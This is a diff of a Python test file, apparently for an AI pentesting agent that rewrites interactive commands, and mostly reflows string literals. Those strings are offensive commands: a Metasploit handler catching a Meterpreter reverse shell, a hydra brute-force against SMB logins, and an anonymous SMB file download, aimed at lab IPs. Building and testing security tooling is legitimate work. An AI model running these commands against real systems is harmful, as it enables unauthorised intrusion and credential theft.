@@ -33,14 +33,16 @@ def test_modify_command_no_commands(settings):
 def test_modify_command_dialog_avoidance(mock_modify, settings, mock_command_response):
     """Test dialog avoidance modification."""
     # Create a state with an interactive command
-    command_input = CommandInputFactory(command="msfconsole", timeout_sec=60)
     state = GraphStateFactory.create_with_command_candidates(
         "Start a Metasploit handler",
         ["msfconsole"]
     )
 
     # Mock the modifier to return a modified state
-    modified_command = "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
+    modified_command = (
+        "msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; "
+        "set LHOST 10.10.10.1; set LPORT 4444; run; exit -y\""
+    )
     expected_result = GraphStateFactory.create_with_command_candidates(
         "Start a Metasploit handler",
         [modified_command]
@@ -65,7 +67,10 @@ def test_modify_command_list_files(mock_modify, settings, mock_list_files_respon
     )
 
     # Mock the modifier to return a modified state
-    modified_command = "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
+    modified_command = (
+        "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
+        "-P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt smb://10.10.10.40"
+    )
     expected_result = GraphStateFactory.create_with_command_candidates(
         "Brute force SMB login",
         [modified_command]
@@ -92,7 +97,10 @@ def test_modify_command_both_modifications(mock_modify, settings):
     )
 
     # Mock the modifier to return a modified state
-    modified_command = "smbclient -N //10.10.10.40/share -c 'get /usr/share/seclists/Usernames/top-usernames-shortlist.txt'"
+    modified_command = (
+        "smbclient -N //10.10.10.40/share -c 'get "
+        "/usr/share/seclists/Usernames/top-usernames-shortlist.txt'"
+    )
     expected_result = GraphStateFactory.create_with_command_candidates(
         "Download user list from SMB share",
         [modified_command]
